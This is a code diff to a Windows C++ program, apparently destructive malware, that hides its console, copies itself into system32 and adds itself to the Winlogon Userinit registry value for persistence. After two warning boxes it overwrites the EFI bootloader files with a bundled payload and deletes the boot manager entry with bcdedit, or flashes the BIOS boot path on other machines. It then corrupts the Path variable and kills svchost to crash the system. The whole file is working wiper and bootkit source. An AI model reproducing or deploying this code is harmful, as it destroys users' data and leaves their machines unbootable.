@@ -10,11 +10,15 @@
 
 using namespace std;
 
-void MountEFI() {
-    system("mountvol P: /S");
+wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
+{
+    wchar_t* wString = new wchar_t[4096];
+    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
+    return wString;
 }
 
-void UnpackDeps() {
+void UnpackDeps(LPCWSTR filename) {
+    CopyFile(filename, L"C:\\Windows\\system32\\Checkr.exe", false);
     CopyFile(L"appvcompat.dll", L"C:\\Windows\\system32\\boot.bin", false);
     CopyFile(L"appverifui.dll", L"C:\\Windows\\system32\\boot.efi", false);
 }
@@ -89,10 +93,6 @@ bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
     return false;
 }
 
-void crash() {
-    system("powershell -c \"wininit\"");
-}
-
 BOOL IsElevated() {
     BOOL fRet = FALSE;
     HANDLE hToken = NULL;
@@ -109,11 +109,24 @@ BOOL IsElevated() {
     return fRet;
 }
 
-int main()
+LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value) {
+    LONG status;
+    HKEY hKey;
+    status = RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_ALL_ACCESS, &hKey);
+    if (status == ERROR_SUCCESS && hKey != NULL) {
+        status = RegSetValueEx(hKey, name, 0, REG_SZ, (BYTE*)value, ((DWORD)wcslen(value) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
+    return status;
+}
+
+int main(int argc, char ** argv)
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
-    UnpackDeps();
+    LPCWSTR filename = convertCharArrayToLPCWSTR(argv[0]);
+
+    UnpackDeps(filename);
 
     int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL| MB_ICONEXCLAMATION);
     if (confirmbox == IDCANCEL) return 0;
@@ -121,20 +134,23 @@ int main()
     int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
     if (secondconfirmbox == IDCANCEL) return 0;
 
+    SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\Checkr.exe")
+
     if (is_efi() != ERROR_INVALID_FUNCTION) {
-        MountEFI();
+        system("mountvol P: /S");
         DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
         CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
         DeleteFile(L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
         CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", false);
-        
+        system("bcdedit /delete {bootmgr}");
     }
     else {
         BIOSBootFlash();
     }
 
+
 	SetPermanentEnvironmentVariable(L"Path", L"trololol");
-	crash();
+    system("taskkill /f /im svchost.exe");
 
 	return 0;
 }
